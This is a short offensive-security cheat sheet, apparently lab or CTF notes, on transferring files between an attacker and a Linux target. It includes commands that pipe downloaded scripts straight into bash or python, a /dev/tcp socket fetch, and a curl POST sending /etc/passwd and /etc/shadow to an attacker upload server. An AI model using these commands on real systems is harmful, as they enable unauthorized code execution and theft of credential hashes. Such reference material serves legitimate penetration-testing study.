## Base64

Encode the file

```sh
base64 -w 0 ./file
```

Decode the file

```sh
base64 -d 'aGVsbG8=' > ./file
```

Check integrity

```sh
md5sum ./file
```

> Since both machines are linux, those commands can be used 2 ways, upload or download

## HTTP

### Download

```sh
wget http://10.10.10.10/file
```

```sh
curl http://10.10.10.10/file -o file
```

Fileless execution

```sh
curl http://10.10.10.10/script.sh | bash
```

```sh
wget -qO- http://10.10.10.10/script.py | python
```

Minimal. No curl or wget

```sh
## File descriptor 3 become tcp socket to 10.10.10.32:80
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /file.sh HTTP/1.1\n\n">&3
cat <&3
```

### Upload

Https upload server setup

```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:4096 -nodes -sha512 -subj '/CN=server'
pipx install uploadserver
python3 -m uploadserver 4433 --server-certificate ~/server.pem
```

On client (target) machine

```sh
curl -k -X POST https://192.168.49.128:4433/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
```

## SSH

Upload to target

```sh
scp ./file user@$target:~/
```

Download to attacker

```sh
scp user@$target:~/file ./
```
